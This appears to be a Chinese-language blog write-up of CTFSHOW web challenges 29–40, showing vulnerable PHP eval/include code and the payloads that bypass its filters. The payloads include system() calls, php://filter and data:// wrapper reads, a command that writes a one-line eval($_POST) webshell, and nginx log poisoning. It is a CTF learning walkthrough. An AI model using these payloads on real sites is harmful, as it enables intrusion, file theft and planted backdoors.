<!DOCTYPE html>
<html lang="en">
    <!-- title -->
<!-- keywords -->
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="author" content="温柔刀">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="温柔刀">
        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
    <meta name="description" content="">
    <meta name="description" content="WEB 入门信息搜集web1-17爆破web18-23命令执行web29(有没懂的知识)123456789if(isset($_GET[&#x27;c&#x27;]))&#123;    $c &#x3D; $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;        eval($c);    &#125;">
<meta property="og:type" content="article">
<meta property="og:title" content="CTFSHOW 刷题汇总">
<meta property="og:url" content="http://example.com/2025/03/26/CTFSHOW%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/index.html">
<meta property="og:site_name" content="三重门">
<meta property="og:description" content="WEB 入门信息搜集web1-17爆破web18-23命令执行web29(有没懂的知识)123456789if(isset($_GET[&#x27;c&#x27;]))&#123;    $c &#x3D; $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;        eval($c);    &#125;">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/CTFSHOW%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/QQ20250510-091241.png">
<meta property="og:image" content="http://example.com/CTFSHOW%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/QQ20250510-144822.png">
<meta property="article:published_time" content="2025-03-26T11:01:01.000Z">
<meta property="article:modified_time" content="2025-07-12T16:10:11.826Z">
<meta property="article:author" content="温柔刀">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/CTFSHOW%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/QQ20250510-091241.png">
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <link rel="icon" href="/assets/favicon.ico">
    <title>CTFSHOW 刷题汇总 · Gentle_knife&#39;s Studio</title>
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
    (function (w) {
        'use strict'
        // rel=preload support test
        if (!w.loadCSS) {
            w.loadCSS = function () {}
        }
        // define on the loadCSS obj
        var rp = (loadCSS.relpreload = {})
        // rel=preload feature support test
        // runs once and returns a function for compat purposes
        rp.support = (function () {
            var ret
            try {
                ret = w.document.createElement('link').relList.supports('preload')
            } catch (e) {
                ret = false
            }
            return function () {
                return ret
            }
        })()

        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
        // then change that media back to its intended value on load
        rp.bindMediaToggle = function (link) {
            // remember existing media attr for ultimate state, or default to 'all'
            var finalMedia = link.media || 'all'

            function enableStylesheet() {
                link.media = finalMedia
            }

            // bind load handlers to enable media
            if (link.addEventListener) {
                link.addEventListener('load', enableStylesheet)
            } else if (link.attachEvent) {
                link.attachEvent('onload', enableStylesheet)
            }

            // Set rel and non-applicable media type to start an async request
            // note: timeout allows this to happen async to let rendering continue in IE
            setTimeout(function () {
                link.rel = 'stylesheet'
                link.media = 'only x'
            })
            // also enable media after 3 seconds,
            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
            setTimeout(enableStylesheet, 3000)
        }

        // loop through link elements in DOM
        rp.poly = function () {
            // double check this to prevent external calls from running
            if (rp.support()) {
                return
            }
            var links = w.document.getElementsByTagName('link')
            for (var i = 0; i < links.length; i++) {
                var link = links[i]
                // qualify links to those with rel=preload and as=style attrs
                if (
                    link.rel === 'preload' &&
                    link.getAttribute('as') === 'style' &&
                    !link.getAttribute('data-loadcss')
                ) {
                    // prevent rerunning on link
                    link.setAttribute('data-loadcss', true)
                    // bind listeners to toggle media back
                    rp.bindMediaToggle(link)
                }
            }
        }

        // if unsupported, run the polyfill
        if (!rp.support()) {
            // run once at least
            rp.poly()

            // rerun poly on an interval until onload
            var run = w.setInterval(rp.poly, 500)
            if (w.addEventListener) {
                w.addEventListener('load', function () {
                    rp.poly()
                    w.clearInterval(run)
                })
            } else if (w.attachEvent) {
                w.attachEvent('onload', function () {
                    rp.poly()
                    w.clearInterval(run)
                })
            }
        }

        // commonjs
        if (typeof exports !== 'undefined') {
            exports.loadCSS = loadCSS
        } else {
            w.loadCSS = loadCSS
        }
    })(typeof global !== 'undefined' ? global : this)
</script>

    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .footer-fixed-btn,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(
            -45deg,
            #444 0,
            #444 80px,
            #333 80px,
            #333 160px
        );
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s infinite;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }
</style>

    <link id="stylesheet-fancybox" rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link id="stylesheet-base" rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link id="stylesheet-mobile" rel="preload" href="/css/mobile.css" as="style" onload="this.onload=null;this.rel='stylesheet';this.media='screen and (max-width: 960px)'">
    <link id="stylesheet-theme-dark" rel="preload" href="/css/dark.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
    <link rel="preload" href="/scripts/main.js" as="script">
    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
    <!-- algolia -->
    <!-- 百度统计  -->
    <!-- 谷歌统计  -->
    <!-- Google tag (gtag.js) -->
<meta name="generator" content="Hexo 7.3.0"></head>

    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
    <script type="text/javascript">
        if (typeof window.$ == undefined) {
            console.warn('jquery load from jsdelivr failed, will load local script')
            document.write('<script src="/lib/jquery.min.js" />')
        }
    </script>
        <body class="post-body">
        <!-- header -->
        <header class="header header-mobile">
    <!-- top read progress line -->
    <div class="header-element">
        <div class="read-progress"></div>
    </div>
    <!-- sidebar menu button -->
    <div class="header-element">
        <div class="header-sidebar-menu">
            <div style="padding-left: 1px;">&#xe775;</div>
        </div>
    </div>
    <!-- header actions -->
    <div class="header-actions">
        <!-- theme mode switch button -->
        <span class="header-theme-btn header-element">
            <i class="fas fa-adjust"></i>
        </span>
        <!-- back to home page text -->
        <span class="home-link header-element">
            <a href="/">Gentle_knife's Studio.</a>
        </span>
    </div>
    <!-- toggle banner -->
    <div class="banner">
        <div class="blog-title header-element">
            <a href="/">Gentle_knife&#39;s Studio.</a>
        </div>
        <div class="post-title header-element">
            <a href="#" class="post-name">CTFSHOW 刷题汇总</a>
        </div>
    </div>
</header>

        <!-- fixed footer -->
        <footer class="footer-fixed">
    <!-- donate button -->

    <!-- back to top button -->
    <div class="footer-fixed-btn footer-fixed-btn--hidden back-top">
        <div>&#xe639;</div>
    </div>
</footer>

        <!-- wrapper -->
        <div class="wrapper">
            <div class="site-intro" style="    height:50vh;
">
    <!-- 主页  -->
    <!-- 404页  -->
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
                CTFSHOW 刷题汇总
            <!-- 404 -->
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            <!-- 404 -->
        </p>
        <!-- 文章页 meta -->
            <div class="post-intros">
                <!-- 文章页标签  -->
                    <div class="post-intro-tags" >
        <a class="post-tag" href="javascript:void(0);" data-tags="wp">wp</a>
</div>

                <!-- 文章字数统计 -->
                    <div class="post-intro-read">
                        <span>Word count: <span class="post-count word-count">13.6k</span>Reading time: <span class="post-count reading-time">63 min</span></span>
                    </div>
                <div class="post-intro-meta">
                    <!-- 撰写日期 -->
                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
                    <span class="post-intro-time">2025/03/26</span>
                    <!-- busuanzi -->
                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    <!-- 文章分享 -->
                    <span class="share-wrapper">
                        <span class="iconfont-archer share-icon">&#xe71d;</span>
                        <span class="share-text">Share</span>
                        <ul class="share-list">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
    </div>
</div>

            <script>
  // get user agent
  function getBrowserVersions() {
    var u = window.navigator.userAgent
    return {
      userAgent: u,
      trident: u.indexOf('Trident') > -1, //IE内核
      presto: u.indexOf('Presto') > -1, //opera内核
      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
      iPad: u.indexOf('iPad') > -1, //是否为iPad
      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
    }
  }
  var browser = {
    versions: getBrowserVersions(),
  }
  console.log('userAgent: ' + browser.versions.userAgent)

  // callback
  function fontLoaded() {
    console.log('font loaded')
    if (document.getElementsByClassName('site-intro-meta')) {
      document
        .getElementsByClassName('intro-title')[0]
        .classList.add('intro-fade-in')
      document
        .getElementsByClassName('intro-subtitle')[0]
        .classList.add('intro-fade-in')
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in')
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb() {
    if (browser.versions.uc) {
      console.log('UCBrowser')
      fontLoaded()
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular'],
        },
        loading: function () {
          // 所有字体开始加载
          // console.log('font loading');
        },
        active: function () {
          // 所有字体已渲染
          fontLoaded()
        },
        inactive: function () {
          // 字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout')
          fontLoaded()
        },
        timeout: 5000, // Set the timeout to two seconds
      })
    }
  }

  function asyncErr() {
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document,
      t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0]
    o.src = u
    if (cb) {
      o.addEventListener(
        'load',
        function (e) {
          cb(null, e)
        },
        false
      )
    }
    if (err) {
      o.addEventListener(
        'error',
        function (e) {
          err(null, e)
        },
        false
      )
    }
    s.parentNode.insertBefore(o, s)
  }

  var asyncLoadWithFallBack = function (arr, success, reject) {
    var currReject = function () {
      reject()
      arr.shift()
      if (arr.length) async(arr[0], success, currReject)
    }

    async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack(
    [
      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
      "/lib/webfontloader.min.js",
    ],
    asyncCb,
    asyncErr
  )
</script>

            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" alt="loading">
            <div class="container container-unloaded">
                <main class="main post-page">
    <article class="article-entry">
        <h1 id="WEB-入门"><a href="#WEB-入门" class="headerlink" title="WEB 入门"></a>WEB 入门</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="web1-17"><a href="#web1-17" class="headerlink" title="web1-17"></a>web1-17</h3><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h3 id="web18-23"><a href="#web18-23" class="headerlink" title="web18-23"></a>web18-23</h3><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="web29-有没懂的知识"><a href="#web29-有没懂的知识" class="headerlink" title="web29(有没懂的知识)"></a>web29(有没懂的知识)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>eval 是 PHP 里的一个内置函数，它的作用是把字符串当作 PHP 代码来执行。<br><code>?c=system(&quot;cat f*&quot;);</code></p>
<blockquote>
<h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><p>拿到题目，可以看到通过 eval 函数可以执行 php 代码或者系统命令，其中过滤了 flag。</p>
<p><code>$_GET[c]</code>的意思是我们输入 c 参数； pregmatch 是正则匹配是否包含 flag，<code>if(!preg_match(&quot;/flag/i&quot;, $c))</code>，&#x2F;i 忽略大小写，如果输入参数中不包含 flag 的大小写，则进入 if 判断内部。 还有&#x2F;m 等参数表示多行匹配，具体可以参考这里：<a target="_blank" rel="noopener" href="https://www.php.cn/php-weizijiaocheng-354831.html">https://www.php.cn/php-weizijiaocheng-354831.html</a></p>
<p><code> eval($c)</code>;就是本题的漏洞点 ，这个之前的输入过滤太简单了。eval 内执行的是 php 代码，必须以分号结尾。eval 和其他函数的对比可以参考这里：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39934520/article/details/109231480">https://blog.csdn.net/weixin_39934520/article/details/109231480</a></p>
<h3 id="分别以如下方法尝试拿到-flag"><a href="#分别以如下方法尝试拿到-flag" class="headerlink" title="分别以如下方法尝试拿到 flag:"></a>分别以如下方法尝试拿到 flag:</h3><h4 id="1、直接执行系统命令"><a href="#1、直接执行系统命令" class="headerlink" title="1、直接执行系统命令"></a>1、直接执行系统命令</h4><p><code>?c=system(&quot;tac%20fla*&quot;); </code>利用 tac 与 system 结合，拿到 flag</p>
<p>因为可以利用 system 来间接执行系统命令，如果 flag 不在当前目录，也可以利用<code>?c=system(&quot;ls&quot;);</code> 来查看到底在哪里。</p>
<h4 id="2、内敛执行-（反字节符）"><a href="#2、内敛执行-（反字节符）" class="headerlink" title="2、内敛执行 （反字节符）"></a>2、内敛执行 （反字节符）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">注意结尾的分号，注意写 writeup 时，因为有反字节符，要核对一下是否转义，需要再在页面上确认一下。 利用 echo 命令和 tac 相结合来实现。注意 flag 采用*绕过，\`反字节符，是键盘左上角与~在一起的那个。</span><br><span class="line"></span><br><span class="line">#### 3、利用参数输入+eval</span><br><span class="line"></span><br><span class="line">`?c=eval($_GET[1]);&amp;1=phpinfo();`</span><br><span class="line">试一下，没问题，可以看到 phpinfo 的信息。 然后就使用`?c=eval($_GET[1]);&amp;1=system(ls);`看一下当前目录都有什么，也可以`?c=eval($_GET[1]);&amp;1=system(&quot;ls%20/&quot;);`看一下根目录都有什么。 注意上一行结尾的分号都不能省略。因为是以 php 代码形式来执行的，所以结尾必须有分号。此外查看根目录时，必须用引号包裹，不太清楚原因，目前觉得因为 system 的参数必须是 string。</span><br><span class="line"></span><br><span class="line">#### 4、利用参数输入+include</span><br><span class="line"></span><br><span class="line">这里的 eval 也可以换为 include，并且可以不用括号。但是仅仅可以用来读文件了。</span><br><span class="line">`?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php`</span><br><span class="line">（参考 y4tacker 师傅的解法：https://blog.csdn.net/solitudi/article/details/109837640）</span><br><span class="line"></span><br><span class="line">也可以尝试写入木马 `file_put_contents(&quot;alb34t.php&quot;,%20%27&lt;?php%20eval($_POST[&quot;cmd&quot;]);%20?&gt;%27);` 访问 alb34t.php，然后就可以连马。</span><br><span class="line"></span><br><span class="line">#### 5、利用 cp 命令将 flag 拷贝到别处</span><br><span class="line"></span><br><span class="line">?c=system(&quot;cp%20fl*g.php%20a.txt%20&quot;);</span><br><span class="line">然后浏览器访问 a.txt，读取即可。</span><br><span class="line"></span><br><span class="line">### web30</span><br><span class="line">```php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">   $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">   if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;</span><br><span class="line">       eval($c);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></blockquote>
<p><code>?c=eval($_GET[1]);&amp;1=system(&quot;tac fla*&quot;);</code></p>
<h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;, $c))&#123;</span><br></pre></td></tr></table></figure>

<p><code>?c=eval($_GET[1]);&amp;1=system(&quot;tac fla*&quot;);</code></p>
<h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;, $c))&#123;</span><br></pre></td></tr></table></figure>

<p><code>?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p>
<h3 id="web33-（未复现）"><a href="#web33-（未复现）" class="headerlink" title="web33 （未复现）"></a>web33 （未复现）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;, $c))&#123;</span><br></pre></td></tr></table></figure>

<p>与前一关相比，貌似就多过滤了双引号号，所以上一关 payload 依然适用</p>
<p>php 中不需要括号的函数，如：<br><code>echo 123; print 123; die; include &quot;/etc/passwd&quot;; require &quot;/etc/passwd&quot;; include_once &quot;/etc/passwd&quot;; require_once &quot;etc/passwd&quot;;</code><br>这里我们利用<strong>include</strong>构造 payload</p>
<p><code>url/?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p>
<p>其中?&gt;代替分号，页面会显示 flag.php 内容的 base64 编码，解码即可获取 flag</p>
<p>还有一种方法，日志注入<br>url&#x2F;?c&#x3D;include$_GET[1]?%3E&amp;1&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log 是 nginx 默认的 access 日志路径，访问该路径时，在 User-Agent 中写入一句话木马，然后用中国蚁剑连接即可</p>
<p><code>?c=include$_GET[1]?&gt;&amp;1=data://text/plain</code></p>
<h3 id="web34（未复现）"><a href="#web34（未复现）" class="headerlink" title="web34（未复现）"></a>web34（未复现）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;, $c))&#123;</span><br></pre></td></tr></table></figure>

<p>上面的 data 和 php 协议不能用了</p>
<h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><p><img src="/CTFSHOW%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/QQ20250510-091241.png" alt="QQ20250510-091241"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">题目对常见命令都进行过滤, 但是仔细发现可以利用 include 进行绕过, 具体实现方式为 eval(include flag.php;); ,但是题目屏蔽了分号(;)和点号(.), 其中分号可以使用?&gt;平替,但是点号无法绕过, 遂使用 post 执行 php 代码注入 flag.php, 因此可得 payload:</span><br><span class="line"></span><br><span class="line">GET：?c=include$_GET[1]?&gt;&amp;1=php://input</span><br><span class="line"></span><br><span class="line">POST：&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br><span class="line"></span><br><span class="line">需要注意,因为 POST 没有按照 key=value 封装数据, 因此 hackBar 认为数据有问题, 不会发送数据, 可以使用 Burp Suite 发送数据</span><br><span class="line"></span><br><span class="line">补充: php://input 默认读取没有处理过的 POST 数据</span><br></pre></td></tr></table></figure>

<h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;, $c))&#123;</span><br></pre></td></tr></table></figure>

<p><img src="/CTFSHOW%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/QQ20250510-144822.png" alt="QQ20250510-144822"></p>
<p><code>?c=include$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</code></p>
<h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>

<p>从 eval 变成 include</p>
<blockquote>
<p>单独的 ?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain 并没有任何实际执行或展示数据的功能，它只是表达了数据传递的方式，需要后续指定数据内容，比如 ?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,Hello%20World 就是传递纯文本 “Hello World”。</p>
</blockquote>
<p><code>?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</code></p>
<p><code>?c=data://text/plain,&lt;?=system(&quot;tac fla*&quot;)?&gt;</code></p>
<p>web38,39</p>
<h3 id="web40-未"><a href="#web40-未" class="headerlink" title="web40(未)"></a>web40(未)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">       <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>题解，查看当前工作目录 getcwd()，扫描当前目录及文件”scandir()”输出 为数组，flag.php 在倒数第二个个位置那就数组倒置 array_revers()，变为正数第二，在使用 next()函数指向从第一个指向第二个（及指向 flag.php）,最后使用 show_source（）查看文件的内容 ?c&#x3D;print_r(show_source(next(array_reverse(scandir(getcwd())))));</p>
<p>url+?c&#x3D;print_r(getcwd()); &#x3D;&#x3D;&#x3D;&gt; &#x2F;var&#x2F;www&#x2F;html</p>
<p>url+?c&#x3D;print_r(scandir(getcwd())); &#x3D;&#x3D;&#x3D;&gt; Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; flag.php [3] &#x3D;&gt; index.php )</p>
<p>url+?c&#x3D;print_r(array_reverse(scandir(getcwd()))); &#x3D;&#x3D;&gt; Array ( [0] &#x3D;&gt; index.php [1] &#x3D;&gt; flag.php [2] &#x3D;&gt; .. [3] &#x3D;&gt; . )</p>
<p>url+?c&#x3D;print_r(next(array_reverse(scandir(getcwd())))); &#x3D;&#x3D;&gt; flag.php</p>
<p>url+?c&#x3D;print_r(show_source(next(array_reverse(scandir(getcwd()))))); &#x3D;&#x3D;&gt; $flag&#x3D;”ctfshow{eca2e7df-d196-4b71-9632-ad4d32e194d3}”;</p>
</blockquote>
<blockquote>
<p>法一</p>
<p>c&#x3D;eval(array_pop(next(get_defined_vars())));&#x2F;&#x2F;需要 POST 传入参数为 1&#x3D;system(‘tac fl*’);</p>
<p>get_defined_vars() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如 GET、POST、FILE 等等。</p>
<p>next()将内部指针指向数组中的下一个元素，并输出。</p>
<p>array_pop() 函数删除数组中的最后一个元素并返回其值。</p>
<p>法二</p>
<p>c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); 或者 c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));</p>
<p>getcwd() 函数返回当前工作目录。它可以代替 pos(localeconv())</p>
<p>localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回值为数组且第一项为”.”</p>
<p>pos():输出数组第一个元素，不改变指针；</p>
<p>current() 函数返回数组中的当前元素（单元）,默认取第一个值，和 pos()一样</p>
<p>scandir() 函数返回指定目录中的文件和目录的数组。这里因为参数为”.”所以遍历当前目录</p>
<p>array_reverse():数组逆置</p>
<p>next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以</p>
<p>show_source():查看源码</p>
<p>pos() 函数返回数组中的当前元素的值。该函数是 current()函数的别名。</p>
<p>每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p>
<p>提示：该函数不会移动数组内部指针。</p>
<p>相关的方法：</p>
<p>current()返回数组中的当前元素的值。</p>
<p>end()将内部指针指向数组中的最后一个元素，并输出。</p>
<p>next()将内部指针指向数组中的下一个元素，并输出。</p>
<p>prev()将内部指针指向数组中的上一个元素，并输出。</p>
<p>reset()将内部指针指向数组中的第一个元素，并输出。</p>
<p>each()返回当前元素的键名和键值，并将内部指针向前移动。</p>
</blockquote>
<blockquote>
<p>我来解释这个 payload：?c&#x3D;eval(next(reset(get_defined_vars())));&amp;pay&#x3D;system(“tac flag.php”); &#x2F;&#x2F;get_defined_vars()用于以数组的形式返回所有已定义的变量值（包括 URL 屁股后面接的 pay），这里源码只定义了一个变量即 c，加上你引入的 pay 就两个变量值了。reset 用于将指向返回变量数组的指针指向第一个变量即 c，next 向前移动一位指针即 pay，eval 执行返回的值就是咱们定义的恶意代码。我这边去掉 system()函数前的分号了，也能出结果。</p>
</blockquote>
